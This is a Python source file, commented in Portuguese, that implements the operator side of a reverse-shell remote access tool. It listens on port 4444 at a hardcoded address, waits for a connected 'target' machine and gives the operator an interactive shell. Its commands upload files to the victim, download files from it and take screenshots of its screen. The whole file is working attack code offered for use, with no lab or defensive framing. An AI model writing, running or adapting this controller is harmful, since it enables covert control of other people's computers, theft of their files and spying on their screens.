import socket  # para criar uma nova conexão
from termcolor import colored  # para dar cor ao terminal
import json
import os

def data_send(data):
    """Envia dados ao alvo."""
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def data_recv():
    """Recebe dados do alvo."""
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)  
        except ValueError:
            continue

def upload_file(file):
    """Faz upload de um arquivo para o alvo."""
    try:
        with open(file, 'rb') as f:
            target.send(f.read())
    except FileNotFoundError:
        print(colored(f"[!] Arquivo '{file}' não encontrado.", 'red'))

def download_file(file):
    """Faz download de um arquivo do alvo."""
    try:
        with open(file, 'wb') as f:
            target.settimeout(5)
            while True:
                chunk = target.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
    except socket.timeout:
        print(colored("[!] Timeout ao receber o arquivo.", 'red'))
    finally:
        target.settimeout(None)

def t_commun():
    """Comunicação com o alvo."""
    count = 0
    while True:
        try:
            comm = input(f'* Shell~{ip}: ')
            data_send(comm)

            if comm == 'exit':
                break
            elif comm == 'clear':
                os.system('clear' if os.name != 'nt' else 'cls')
            elif comm.startswith('cd '):
                pass  # Comando tratado no lado do cliente
            elif comm.startswith('upload '):
                upload_file(comm[7:])
            elif comm.startswith('download '):
                download_file(comm[9:])
            elif comm.startswith('screenshot'):
                screenshot_file = f'screenshot{count}.png'
                with open(screenshot_file, 'wb') as f:
                    target.settimeout(5)
                    while True:
                        chunk = target.recv(1024)
                        if not chunk:
                            break
                        f.write(chunk)
                target.settimeout(None)
                count += 1
                print(colored(f"[+] Screenshot salva como {screenshot_file}", 'green'))
            elif comm == 'help':
                print(colored(
                    '''\n
                    exit: Fecha a sessão com a máquina alvo.
                    cd: Altera o diretório na máquina alvo. Use: cd <nome-do-diretório>.
                    upload: Envia um arquivo para a máquina alvo. Use: upload <caminho-do-arquivo>
                    download: Baixa um arquivo da máquina alvo. Use: download <caminho-do-arquivo>
                    screenshot: Captura uma captura de tela da máquina alvo.
                    clear: Limpa a tela do terminal.
                    help: Mostra os comandos disponíveis.
                    ''', 'green'))
            else:
                answer = data_recv()
                print(answer)

        except Exception as e:
            print(colored(f"[!] Erro: {e}", 'red'))

# Configurando o socket do servidor
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.bind(('172.22.168.27', 4444))
    print(colored('[-] Aguardando conexões', 'yellow'))
    sock.listen(5)

    target, ip = sock.accept()
    print(colored(f'[+] Conectado com: {ip}', 'green'))
    t_commun()
except Exception as e:
    print(colored(f"[!] Erro ao iniciar o servidor: {e}", 'red'))
finally:
    sock.close()
